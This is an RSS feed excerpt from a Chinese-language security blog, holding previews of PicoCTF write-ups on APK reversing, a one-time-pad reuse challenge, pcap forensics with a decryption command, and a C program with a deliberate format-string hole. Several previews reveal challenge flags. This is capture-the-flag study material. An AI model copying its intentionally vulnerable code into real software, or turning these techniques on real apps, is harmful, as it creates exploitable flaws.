Strings會放在&lt;code>./res/values/strings.xml&lt;/code>&lt;/p></description></item><item><title>PicoCTF - droids3</title><link>https://bernie6401.github.io/docs/security/practice/picoctf/reverse/picoctf---droids3/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/picoctf/reverse/picoctf---droids3/</guid><description>&lt;h1 id="picoctf---droids3">
 PicoCTF - droids3
 &lt;a class="anchor" href="#picoctf---droids3">#&lt;/a>
&lt;/h1>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://blog.huli.tw/2023/04/27/android-apk-decompile-intro-1/"> Android App 逆向入門之一：拆開與重組 apk &lt;/a>
&lt;a href="https://blog.huli.tw/2023/04/27/android-apk-decompile-intro-2/"> Android App 逆向入門之二：修改 smali 程式碼 &lt;/a>&lt;/p>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;pre tabindex="0">&lt;code class="language-java=" data-lang="java=">package com.hellocmu.picoctf;

import android.content.Context;

/* loaded from: classes.dex */
public class FlagstaffHill {
 public static native String cilantro(String str);

 public static String nope(String input) {
 return &amp;#34;don&amp;#39;t wanna&amp;#34;;
 }

 public static String yep(String input) {
 return cilantro(input);
 }

 public static String getFlag(String input, Context ctx) {
 String flag = nope(input);
 return flag;
 }
}
&lt;/code>&lt;/pre>&lt;h2 id="recon">
 Recon
 &lt;a class="anchor" href="#recon">#&lt;/a>
&lt;/h2>
&lt;p>利用前一題學到的工具(JADX)，先decompiler一下原本的程式在幹嘛(source code如上)，會發現getFlag這個method所呼叫的nope只會吐出&lt;code>don't wanna&lt;/code>，而真正會print出flag的是yep這個method，所以我們可以修改一下，不過修改之前還是要知道一下流程
Apktool decode apk file$\to$修改必要的地方$\to$Apktool重新打包$\to$簽名$\to$Align$\to$Done，這一個部分在&lt;a href="https://blog.huli.tw/2023/04/27/android-apk-decompile-intro-2/"> Android App 逆向入門之二：修改 smali 程式碼 &lt;/a>有詳細的說明&lt;/p></description></item><item><title>PicoCTF - droids4</title><link>https://bernie6401.github.io/docs/security/practice/picoctf/reverse/picoctf---droids4/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/picoctf/reverse/picoctf---droids4/</guid><description>&lt;h1 id="picoctf---droids4">
 PicoCTF - droids4
 &lt;a class="anchor" href="#picoctf---droids4">#&lt;/a>
&lt;/h1>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://blog.huli.tw/2023/04/27/android-apk-decompile-intro-1/"> Android App 逆向入門之一：拆開與重組 apk &lt;/a>
&lt;a href="https://blog.huli.tw/2023/04/27/android-apk-decompile-intro-2/"> Android App 逆向入門之二：修改 smali 程式碼 &lt;/a>&lt;/p>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">package&lt;/span> com.hellocmu.picoctf;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> android.content.Context;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">/* loaded from: classes.dex */&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">class&lt;/span> &lt;span style="color:#a6e22e">FlagstaffHill&lt;/span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">static&lt;/span> &lt;span style="color:#66d9ef">native&lt;/span> String &lt;span style="color:#a6e22e">cardamom&lt;/span>(String str);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">static&lt;/span> String &lt;span style="color:#a6e22e">getFlag&lt;/span>(String input, Context ctx) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> StringBuilder ace &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> StringBuilder(&lt;span style="color:#e6db74">&amp;#34;aaa&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> StringBuilder jack &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> StringBuilder(&lt;span style="color:#e6db74">&amp;#34;aaa&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> StringBuilder queen &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> StringBuilder(&lt;span style="color:#e6db74">&amp;#34;aaa&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> StringBuilder king &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> StringBuilder(&lt;span style="color:#e6db74">&amp;#34;aaa&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ace.&lt;span style="color:#a6e22e">setCharAt&lt;/span>(0, (&lt;span style="color:#66d9ef">char&lt;/span>) (ace.&lt;span style="color:#a6e22e">charAt&lt;/span>(0) &lt;span style="color:#f92672">+&lt;/span> 4));
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ace.&lt;span style="color:#a6e22e">setCharAt&lt;/span>(1, (&lt;span style="color:#66d9ef">char&lt;/span>) (ace.&lt;span style="color:#a6e22e">charAt&lt;/span>(1) &lt;span style="color:#f92672">+&lt;/span> 19));
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ace.&lt;span style="color:#a6e22e">setCharAt&lt;/span>(2, (&lt;span style="color:#66d9ef">char&lt;/span>) (ace.&lt;span style="color:#a6e22e">charAt&lt;/span>(2) &lt;span style="color:#f92672">+&lt;/span> 18));
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> jack.&lt;span style="color:#a6e22e">setCharAt&lt;/span>(0, (&lt;span style="color:#66d9ef">char&lt;/span>) (jack.&lt;span style="color:#a6e22e">charAt&lt;/span>(0) &lt;span style="color:#f92672">+&lt;/span> 7));
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> jack.&lt;span style="color:#a6e22e">setCharAt&lt;/span>(1, (&lt;span style="color:#66d9ef">char&lt;/span>) (jack.&lt;span style="color:#a6e22e">charAt&lt;/span>(1) &lt;span style="color:#f92672">+&lt;/span> 0));
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> jack.&lt;span style="color:#a6e22e">setCharAt&lt;/span>(2, (&lt;span style="color:#66d9ef">char&lt;/span>) (jack.&lt;span style="color:#a6e22e">charAt&lt;/span>(2) &lt;span style="color:#f92672">+&lt;/span> 1));
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> queen.&lt;span style="color:#a6e22e">setCharAt&lt;/span>(0, (&lt;span style="color:#66d9ef">char&lt;/span>) (queen.&lt;span style="color:#a6e22e">charAt&lt;/span>(0) &lt;span style="color:#f92672">+&lt;/span> 0));
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> queen.&lt;span style="color:#a6e22e">setCharAt&lt;/span>(1, (&lt;span style="color:#66d9ef">char&lt;/span>) (queen.&lt;span style="color:#a6e22e">charAt&lt;/span>(1) &lt;span style="color:#f92672">+&lt;/span> 11));
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> queen.&lt;span style="color:#a6e22e">setCharAt&lt;/span>(2, (&lt;span style="color:#66d9ef">char&lt;/span>) (queen.&lt;span style="color:#a6e22e">charAt&lt;/span>(2) &lt;span style="color:#f92672">+&lt;/span> 15));
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> king.&lt;span style="color:#a6e22e">setCharAt&lt;/span>(0, (&lt;span style="color:#66d9ef">char&lt;/span>) (king.&lt;span style="color:#a6e22e">charAt&lt;/span>(0) &lt;span style="color:#f92672">+&lt;/span> 14));
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> king.&lt;span style="color:#a6e22e">setCharAt&lt;/span>(1, (&lt;span style="color:#66d9ef">char&lt;/span>) (king.&lt;span style="color:#a6e22e">charAt&lt;/span>(1) &lt;span style="color:#f92672">+&lt;/span> 20));
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> king.&lt;span style="color:#a6e22e">setCharAt&lt;/span>(2, (&lt;span style="color:#66d9ef">char&lt;/span>) (king.&lt;span style="color:#a6e22e">charAt&lt;/span>(2) &lt;span style="color:#f92672">+&lt;/span> 15));
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> String password &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;&amp;#34;&lt;/span>.&lt;span style="color:#a6e22e">concat&lt;/span>(queen.&lt;span style="color:#a6e22e">toString&lt;/span>()).&lt;span style="color:#a6e22e">concat&lt;/span>(jack.&lt;span style="color:#a6e22e">toString&lt;/span>()).&lt;span style="color:#a6e22e">concat&lt;/span>(ace.&lt;span style="color:#a6e22e">toString&lt;/span>()).&lt;span style="color:#a6e22e">concat&lt;/span>(king.&lt;span style="color:#a6e22e">toString&lt;/span>());
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> input.&lt;span style="color:#a6e22e">equals&lt;/span>(password) &lt;span style="color:#f92672">?&lt;/span> &lt;span style="color:#e6db74">&amp;#34;call it&amp;#34;&lt;/span> : &lt;span style="color:#e6db74">&amp;#34;NOPE&amp;#34;&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="recon">
 Recon
 &lt;a class="anchor" href="#recon">#&lt;/a>
&lt;/h2>
&lt;p>基本上用眼睛看應該看的出來password是啥，不過他最後只會print出&lt;code>call it&lt;/code>或是&lt;code>NOPE&lt;/code>，所以我們要像上一題一樣改造一下smali，可以對照一下前一題的smali是怎麼call的&lt;/p></description></item><item><title>PicoCTF - Easy as GDB</title><link>https://bernie6401.github.io/docs/security/practice/picoctf/reverse/picoctf---easy-as-gdb/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/picoctf/reverse/picoctf---easy-as-gdb/</guid><description>&lt;h1 id="picoctf---easy-as-gdb">
 PicoCTF - Easy as GDB
 &lt;a class="anchor" href="#picoctf---easy-as-gdb">#&lt;/a>
&lt;/h1>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler IDA Main Function&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-cpp=" data-lang="cpp=">int __cdecl main(int argc, const char **argv, const char **envp)
{
 char *str_len; // eax
 int v5; // [esp-8h] [ebp-20h]
 int v6; // [esp-4h] [ebp-1Ch]
 char *input_flag; // [esp+4h] [ebp-14h]
 size_t str_len_1; // [esp+8h] [ebp-10h]
 char *src; // [esp+Ch] [ebp-Ch]

 input_flag = calloc(0x200u, 1u);
 printf(&amp;#34;input the flag: &amp;#34;);
 fgets(input_flag, 512, stdin);
 str_len = strnlen(aZNh, 512, v5, v6);
 src = enc_input(str_len, str_len);
 sub_7C2(src, 1, 1);
 if ( check_flag(src, str_len_1) == 1 )
 puts(&amp;#34;Correct!&amp;#34;);
 else
 puts(&amp;#34;Incorrect.&amp;#34;);
 return 0;
}
&lt;/code>&lt;/pre>&lt;p>:::&lt;/p></description></item><item><title>PicoCTF - Easy Peasy</title><link>https://bernie6401.github.io/docs/security/practice/picoctf/crypto/classic/picoctf---easy-peasy/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/picoctf/crypto/classic/picoctf---easy-peasy/</guid><description>&lt;h1 id="picoctf---easy-peasy">
 PicoCTF - Easy Peasy
 &lt;a class="anchor" href="#picoctf---easy-peasy">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-picoctf-ctf-crypto">
 tags: &lt;code>PicoCTF&lt;/code> &lt;code>CTF&lt;/code> &lt;code>Crypto&lt;/code>
 &lt;a class="anchor" href="#tags-picoctf-ctf-crypto">#&lt;/a>
&lt;/h6>
&lt;p>Challenge: &lt;a href="">Easy Peasy&lt;/a>&lt;/p>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler source code&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-python=" data-lang="python=">#!/usr/bin/python3 -u
import os.path

KEY_FILE = &amp;#34;key&amp;#34;
KEY_LEN = 50000
FLAG_FILE = &amp;#34;flag&amp;#34;

def startup(key_location):
	flag = open(FLAG_FILE).read()
	kf = open(KEY_FILE, &amp;#34;rb&amp;#34;).read()

	start = key_location
	stop = key_location + len(flag)

	key = kf[start:stop]
	key_location = stop

	result = list(map(lambda p, k: &amp;#34;{:02x}&amp;#34;.format(ord(p) ^ k), flag, key))
	print(&amp;#34;This is the encrypted flag!\n{}\n&amp;#34;.format(&amp;#34;&amp;#34;.join(result)))

	return key_location

def encrypt(key_location):
	ui = input(&amp;#34;What data would you like to encrypt? &amp;#34;).rstrip()
	if len(ui) == 0 or len(ui) &amp;gt; KEY_LEN:
		return -1

	start = key_location
	stop = key_location + len(ui)

	kf = open(KEY_FILE, &amp;#34;rb&amp;#34;).read()

	if stop &amp;gt;= KEY_LEN:
		stop = stop % KEY_LEN
		key = kf[start:] + kf[:stop]
	else:
		key = kf[start:stop]
	key_location = stop

	result = list(map(lambda p, k: &amp;#34;{:02x}&amp;#34;.format(ord(p) ^ k), ui, key))

	print(&amp;#34;Here ya go!\n{}\n&amp;#34;.format(&amp;#34;&amp;#34;.join(result)))

	return key_location


print(&amp;#34;******************Welcome to our OTP implementation!******************&amp;#34;)
c = startup(0)
while c &amp;gt;= 0:
	c = encrypt(c)
&lt;/code>&lt;/pre>&lt;p>:::&lt;/p></description></item><item><title>PicoCTF - Easy Peasy Or Bad Questions</title><link>https://bernie6401.github.io/docs/security/practice/picoctf/bad-questions/picoctf---easy-peasy-or-bad-questions/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/picoctf/bad-questions/picoctf---easy-peasy-or-bad-questions/</guid><description>&lt;h1 id="picoctf---easy-peasy-or-bad-questions">
 PicoCTF - Easy Peasy Or Bad Questions
 &lt;a class="anchor" href="#picoctf---easy-peasy-or-bad-questions">#&lt;/a>
&lt;/h1>
&lt;p>[TOC]&lt;/p>
&lt;h2 id="challenge-logon">
 Challenge: &lt;a href="https://play.picoctf.org/practice/challenge/46?category=1&amp;amp;page=1">logon&lt;/a>🍰
 &lt;a class="anchor" href="#challenge-logon">#&lt;/a>
&lt;/h2>
&lt;h3 id="exploit---set-cookie">
 Exploit - Set cookie
 &lt;a class="anchor" href="#exploit---set-cookie">#&lt;/a>
&lt;/h3>
&lt;p>&lt;img src="https://i.imgur.com/lZ4wQUW.png" alt="" />
&lt;img src="https://i.imgur.com/OUTQtCP.png" alt="" />&lt;/p>
&lt;hr>
&lt;h2 id="challenge-where-are-the-robots">
 Challenge: &lt;a href="https://play.picoctf.org/practice/challenge/4?category=1&amp;amp;page=1">where are the robots&lt;/a>🍰
 &lt;a class="anchor" href="#challenge-where-are-the-robots">#&lt;/a>
&lt;/h2>
&lt;h3 id="exploit---robotstxt">
 Exploit - robots.txt
 &lt;a class="anchor" href="#exploit---robotstxt">#&lt;/a>
&lt;/h3>
&lt;p>Payload: &lt;code>https://jupiter.challenges.picoctf.org/problem/56830/robots.txt&lt;/code>
&lt;img src="https://i.imgur.com/LjqyriL.png" alt="" />
Payload: &lt;code>https://jupiter.challenges.picoctf.org/problem/56830/1bb4c.html&lt;/code>
&lt;img src="https://i.imgur.com/NBKgAAg.png" alt="" />&lt;/p>
&lt;hr>
&lt;h2 id="challenge-packets-primer">
 Challenge: &lt;a href="https://play.picoctf.org/practice/challenge/286?category=4&amp;amp;page=2">Packets Primer&lt;/a>🍰
 &lt;a class="anchor" href="#challenge-packets-primer">#&lt;/a>
&lt;/h2>
&lt;h3 id="exploit---search--string-directly">
 Exploit - search &lt;code>{&lt;/code> string directly
 &lt;a class="anchor" href="#exploit---search--string-directly">#&lt;/a>
&lt;/h3>
&lt;p>&lt;img src="https://i.imgur.com/Qf0YaZz.png" alt="" />&lt;/p>
&lt;hr>
&lt;h2 id="challenge-disk-disk-sleuth">
 Challenge: &lt;a href="https://mercury.picoctf.net/static/920731987787c93839776ce457d5ecd6/dds1-alpine.flag.img.gz">Disk, disk, sleuth!&lt;/a>🍰
 &lt;a class="anchor" href="#challenge-disk-disk-sleuth">#&lt;/a>
&lt;/h2>
&lt;h3 id="exploit---strings-search">
 Exploit - Strings search
 &lt;a class="anchor" href="#exploit---strings-search">#&lt;/a>
&lt;/h3>
&lt;pre tabindex="0">&lt;code class="language-bash!" data-lang="bash!">$ file dds1-alpine.flag.img.gz
dds1-alpine.flag.img.gz: gzip compressed data, was &amp;#34;dds1-alpine.flag.img&amp;#34;, last modified: Tue Mar 16 00:19:24 2021, from Unix, original size modulo 2^32 134217728
$ gzip -d dds1-alpine.flag.img.gz
$ ls
dds1-alpine.flag.img
$ strings dds1-alpine.flag.img | grep &amp;#34;pico&amp;#34;
ffffffff81399ccf t pirq_pico_get
ffffffff81399cee t pirq_pico_set
ffffffff820adb46 t pico_router_probe
 SAY picoCTF{f0r3ns1c4t0r_n30phyt3_564ff1a0}
&lt;/code>&lt;/pre>&lt;hr>
&lt;h2 id="challenge-sleuthkit-apprentice">
 Challenge: &lt;a href="https://play.picoctf.org/practice/challenge/300?category=4&amp;amp;page=3">Sleuthkit Apprentice&lt;/a>🍰
 &lt;a class="anchor" href="#challenge-sleuthkit-apprentice">#&lt;/a>
&lt;/h2>
&lt;h3 id="exploit---ftk-imager">
 Exploit - FTK Imager
 &lt;a class="anchor" href="#exploit---ftk-imager">#&lt;/a>
&lt;/h3>
&lt;p>&lt;img src="https://i.imgur.com/4iZjRu6.png" alt="" />&lt;/p></description></item><item><title>PicoCTF - Eavesdrop</title><link>https://bernie6401.github.io/docs/security/practice/picoctf/misc/flow/picoctf---eavesdrop/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/picoctf/misc/flow/picoctf---eavesdrop/</guid><description>&lt;h1 id="picoctf---eavesdrop">
 PicoCTF - Eavesdrop
 &lt;a class="anchor" href="#picoctf---eavesdrop">#&lt;/a>
&lt;/h1>
&lt;h2 id="recon">
 Recon
 &lt;a class="anchor" href="#recon">#&lt;/a>
&lt;/h2>
&lt;p>這一題是有關eavesdropping，代表有一個中間人監聽了所有conversation，先用一些基本的手段看一下整體的pcap packets(strings searching/IO Graphs/Statistic/Extract Default Protocol File&amp;hellip;)，但是如果跟一下tcp的packets，可以發現傳輸兩方的對話紀錄，包括傳輸資料的加密方式等等，所以我們就可以直接把傳輸資料解密得到flag&lt;/p>
&lt;h2 id="exploit---extract-file--decrypt">
 Exploit - Extract File &amp;amp; Decrypt
 &lt;a class="anchor" href="#exploit---extract-file--decrypt">#&lt;/a>
&lt;/h2>
&lt;ol>
&lt;li>Follow TCP Packets
&lt;pre tabindex="0">&lt;code>Hey, how do you decrypt this file again?
You&amp;#39;re serious?
Yeah, I&amp;#39;m serious
*sigh* openssl des3 -d -salt -in file.des3 -out file.txt -k supersecretpassword123
Ok, great, thanks.
Let&amp;#39;s use Discord next time, it&amp;#39;s more secure.
C&amp;#39;mon, no one knows we use this program like this!
Whatever.
Hey.
Yeah?
Could you transfer the file to me again?
Oh great. Ok, over 9002?
Yeah, listening.
Sent it
Got it.
You&amp;#39;re unbelievable
&lt;/code>&lt;/pre>從以上對話紀錄可以知道他們在9002 port有傳輸資料，並且解密的command是&lt;code>openssl des3 -d -salt -in file.des3 -out file.txt -k supersecretpassword123&lt;/code>&lt;/li>
&lt;li>Extract File
我們可以增加兩個column專門顯示source/destination port
&lt;img src="https://hackmd.io/_uploads/B1ZrNEdOh.png" alt="" />
然後找到port 9002的地方，可以發現No.57有附帶資料，把這筆資料另存起來
&lt;img src="https://hackmd.io/_uploads/r11KNV_O2.png" alt="" />
Note: 儲存資料到file.des3的時候，內容必須要是&lt;code>Salted__9BæÄ'÷b4Ó[ÐNXämn±'-ärGsðÏú :›çk¿«@Û=6&lt;/code>
Note2: 也可以用&lt;code>tcpflow&lt;/code>的方式把資料download下來
&lt;pre tabindex="0">&lt;code class="language-bash!" data-lang="bash!">$ sudo tcpflow -r {pcap file}
&lt;/code>&lt;/pre>&lt;/li>
&lt;li>Decrypt File
&lt;pre tabindex="0">&lt;code class="language-bash!" data-lang="bash!">$ openssl des3 -d -salt -in file.des3 -out file.txt -k supersecretpassword123
*** WARNING : deprecated key derivation used.
Using -iter or -pbkdf2 would be better.
&lt;/code>&lt;/pre>&lt;/li>
&lt;/ol>
&lt;p>Flag: &lt;code>picoCTF{nc_73115_411_dd54ab67}&lt;/code>&lt;/p></description></item><item><title>PicoCTF - fermat-strings</title><link>https://bernie6401.github.io/docs/security/practice/picoctf/pwn/picoctf---fermat-strings/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/picoctf/pwn/picoctf---fermat-strings/</guid><description>&lt;h1 id="picoctf---fermat-strings">
 PicoCTF - fermat-strings
 &lt;a class="anchor" href="#picoctf---fermat-strings">#&lt;/a>
&lt;/h1>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://www.runoob.com/cprogramming/c-function-strcspn.html">C 庫函數 - strcspn()&lt;/a>&lt;/p>
&lt;blockquote>
&lt;p>該函數返回 str1 開頭連續都不含字符串 str2 中字符的字符數。&lt;/p>&lt;/blockquote>
&lt;p>&lt;a href="http://tw.gitbook.net/c_standard_library/c_function_atoi.html">atoi() - C語言庫函數&lt;/a>&lt;/p>
&lt;blockquote>
&lt;p>這個函數返回一個int值轉換的整數。如果冇有有效的轉換可以執行，它返回零。&lt;/p>&lt;/blockquote>
&lt;p>&lt;a href="https://www.runoob.com/cprogramming/c-function-snprintf.html">C 库函数 - snprintf()&lt;/a>&lt;/p>
&lt;blockquote>
&lt;p>snprintf() 函數的返回值是輸出到 str 緩沖區中的字符數，不包括字符串結尾的空字符 \0。如果 snprintf() 輸出的字符數超過了 size 參數指定的緩沖區大小，則輸出的結果會被截斷，只有 size - 1 個字符被寫入緩沖區，最後一個字符為字符串結尾的空字符 \0。&lt;/p>
&lt;p>需要注意的是，snprintf() 函數返回的字符數並不包括字符串結尾的空字符 \0，因此如果需要將輸出結果作為一個字符串使用，則需要在緩沖區的末尾添加一個空字符 \0。&lt;/p>&lt;/blockquote>
&lt;p>&lt;a href="https://www.geeksforgeeks.org/format-specifiers-in-c/">Format Specifiers in C&lt;/a>&lt;/p>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-cpp!" data-lang="cpp!">#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;stdlib.h&amp;gt;
#include &amp;lt;string.h&amp;gt;
#include &amp;lt;unistd.h&amp;gt;
#include &amp;lt;math.h&amp;gt;

#define SIZE 0x100

int main(void)
{
 char A[SIZE];
 char B[SIZE];

 int a = 0;
 int b = 0;

 puts(&amp;#34;Welcome to Fermat\\&amp;#39;s Last Theorem as a service&amp;#34;);

 setbuf(stdout, NULL);
 setbuf(stdin, NULL);
 setbuf(stderr, NULL);

 printf(&amp;#34;A: &amp;#34;);
 read(0, A, SIZE);
 printf(&amp;#34;B: &amp;#34;);
 read(0, B, SIZE);

 A[strcspn(A, &amp;#34;\n&amp;#34;)] = 0;
 B[strcspn(B, &amp;#34;\n&amp;#34;)] = 0;

 a = atoi(A);
 b = atoi(B);

 if(a == 0 || b == 0) {
 puts(&amp;#34;Error: could not parse numbers!&amp;#34;);
 return 1;
 }

 char buffer[SIZE];
 snprintf(buffer, SIZE, &amp;#34;Calculating for A: %s and B: %s\n&amp;#34;, A, B);
 printf(buffer);

 int answer = -1;
 for(int i = 0; i &amp;lt; 100; i++) {
 if(pow(a, 3) + pow(b, 3) == pow(i, 3)) {
 answer = i;
 }
 }

 if(answer != -1) printf(&amp;#34;Found the answer: %d\n&amp;#34;, answer);
}
&lt;/code>&lt;/pre>&lt;p>:::&lt;/p></description></item><item><title>PicoCTF - File types</title><link>https://bernie6401.github.io/docs/security/practice/picoctf/misc/general/picoctf---file-types/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/picoctf/misc/general/picoctf---file-types/</guid><description>&lt;h1 id="picoctf---file-types">
 PicoCTF - File types
 &lt;a class="anchor" href="#picoctf---file-types">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-picoctf-ctf-misc">
 tags: &lt;code>PicoCTF&lt;/code> &lt;code>CTF&lt;/code> &lt;code>Misc&lt;/code>
 &lt;a class="anchor" href="#tags-picoctf-ctf-misc">#&lt;/a>
&lt;/h6>
&lt;p>Challenge: &lt;a href="">File types&lt;/a>&lt;/p>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;h3 id="for-shell-script">
 For Shell Script
 &lt;a class="anchor" href="#for-shell-script">#&lt;/a>
&lt;/h3>
&lt;p>&lt;a href="https://blog.gtwang.org/linux/generate-verify-check-files-md5-sha1-checksum-linux/">Linux MD5&lt;/a>
&lt;a href="https://www.runoob.com/linux/linux-comm-egrep.html">Linux egrep命令&lt;/a>
&lt;a href="https://www.runoob.com/linux/linux-shell-test.html">Shell test 命令&lt;/a>&lt;/p>
&lt;blockquote>
&lt;p>-f 文件名: 如果文件存在且为普通文件则为真&lt;/p>&lt;/blockquote>
&lt;p>&lt;a href="https://phoenixnap.com/kb/linux-add-to-path">How to modify $PATH&lt;/a>
&lt;a href="https://blog.gtwang.org/linux/linux-touch-command-tutorial-examples/">touch - time stamp&lt;/a>
&lt;a href="https://unix.stackexchange.com/questions/291570/what-is-in-bash">What is $$ in bash?&lt;/a>&lt;/p>
&lt;h3 id="for-compress-command">
 For Compress Command
 &lt;a class="anchor" href="#for-compress-command">#&lt;/a>
&lt;/h3>
&lt;p>&lt;a href="https://officeguide.cc/linux-copy-files-to-and-from-archives-cpio-command-tutorial-examples/">Linux 備份檔案操作 cpio 指令教學與範例&lt;/a>
&lt;a href="https://www.geeksforgeeks.org/bzip2-command-in-linux-with-examples/">bzip2 command in Linux&lt;/a>
&lt;a href="https://linuxize.com/post/gzip-command-in-linux/">Gzip Command in Linux&lt;/a>
&lt;a href="https://www.nongnu.org/lzip/manual/lzip_manual.html">Lzip Manual&lt;/a>
&lt;a href="https://manpages.ubuntu.com/manpages/xenial/man1/lz4.1.html">lz4 manual&lt;/a>
&lt;a href="https://manpages.ubuntu.com/manpages/xenial/man1/lzmp.1.html">lzma manual&lt;/a>
&lt;a href="https://linux.die.net/man/1/lzop">lzop(1) - Linux man page&lt;/a>&lt;/p>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler Flag.pdf&lt;/p></description></item><item><title>PicoCTF - filtered-shellcode</title><link>https://bernie6401.github.io/docs/security/practice/picoctf/pwn/picoctf---filtered-shellcode/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/picoctf/pwn/picoctf---filtered-shellcode/</guid><description>&lt;h1 id="picoctf---filtered-shellcode">
 PicoCTF - filtered-shellcode
 &lt;a class="anchor" href="#picoctf---filtered-shellcode">#&lt;/a>
&lt;/h1>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>Shell Code
Reverse&lt;/p>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler Source Code Got From Server After Get Shell&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-cpp!" data-lang="cpp!">#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;stdlib.h&amp;gt;
#include &amp;lt;string.h&amp;gt;

#define MAX_LENGTH 1000

void execute(char *shellcode, size_t length) {
 if (!shellcode || !length) {
 exit(1);
 }
 size_t new_length = length * 2;
 char result[new_length + 1];

 int spot = 0;
 for (int i = 0; i &amp;lt; new_length; i++) {
 if ((i % 4) &amp;lt; 2) {
 result[i] = shellcode[spot++];
 } else {
 result[i] = &amp;#39;\x90&amp;#39;;
